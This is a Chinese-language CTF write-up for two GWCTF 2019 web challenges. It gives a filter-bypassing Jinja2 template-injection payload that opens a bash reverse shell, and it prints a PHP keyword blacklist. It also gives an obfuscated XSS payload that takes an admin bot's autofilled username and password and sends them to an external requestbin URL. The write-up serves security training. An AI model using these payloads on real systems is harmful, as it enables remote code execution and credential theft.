# GWCTF 2019

## 你的名字

``{{1+1}}``报错提示了python后端

发现config被置空了

那么可以利用config来bypass

```
{% iconfigf ''.__claconfigss__.__mconfigro__[2].__subclasconfigses__()[59].__init__.func_glconfigobals.linecconfigache.oconfigs.popconfigen('bash -i >& /dev/tcp/127.0.0.1/233 0>&1') %}1{% endiconfigf %}
```

## mypassword

可以注册，登陆后有反馈界面 F12看到泄露了源码

```php
if(is_array($feedback)){
    echo "<script>alert('反馈不合法');</script>";
    return false;
}
$blacklist = ['_','\'','&','\\','#','%','input','script','iframe','host','onload','onerror','srcdoc','location','svg','form','img','src','getElement','document','cookie'];
foreach ($blacklist as $val) {
    while(true){
        if(stripos($feedback,$val) !== false){
            $feedback = str_ireplace($val,"",$feedback);
        }else{
            break;
        }
    }
}
```

看起来可以交错绕过然后xss

poc
```html
<scriframeipt>alert('233');</scriframeipt>
```

但是开了CSRF,么法直接用xss平台上的pyload了，需要自己写一个xss

怎么利用呢......

之前登陆的时候有个js挺奇怪的

```javascript
if (document.cookie && document.cookie != '') {
	var cookies = document.cookie.split('; ');
	var cookie = {};
	for (var i = 0; i < cookies.length; i++) {
		var arr = cookies[i].split('=');
		var key = arr[0];
		cookie[key] = arr[1];
	}
	if(typeof(cookie['user']) != "undefined" && typeof(cookie['psw']) != "undefined"){
		document.getElementsByName("username")[0].value = cookie['user'];
		document.getElementsByName("password")[0].value = cookie['psw'];
	}//这里会把用户名和密码直接存到cookie里
}
```

那么bot的cookie里肯定有用户名密码，想办法写个js搞出来，但是又不能调用外部js，这里利用访问的二级域名来实现

最后发现bot还能自动填表单。。。


大概构造一个和登录界面一样的表单

```html
<input type="text" name="username">
<input type="password" name="password">
<script src="./js/login.js"></script>
<script>
    var user = document.getElementsByName("username")[0].value;
    var psw = document.getElementsByName("password")[0].value;
    document.location="http://http.requestbin.buuoj.cn/1e8jfct1/?a="+user+"?b="+psw;
</script>
```

然后交错bypass即可

```html
<incookieput type="text" name="username">
<incookieput type="password" name="password">
<scrcookieipt scookierc="./js/login.js"></scrcookieipt>
<scrcookieipt>
    var user = docucookiement.getcookieElementsByName("username")[0].value;
    var psw = docucookiement.getcookieElementsByName("password")[0].value;
    docucookiement.locacookietion="http://http.requestbin.buuoj.cn/swvl36sw/?a="+user+"?b="+psw;
</scrcookieipt>
```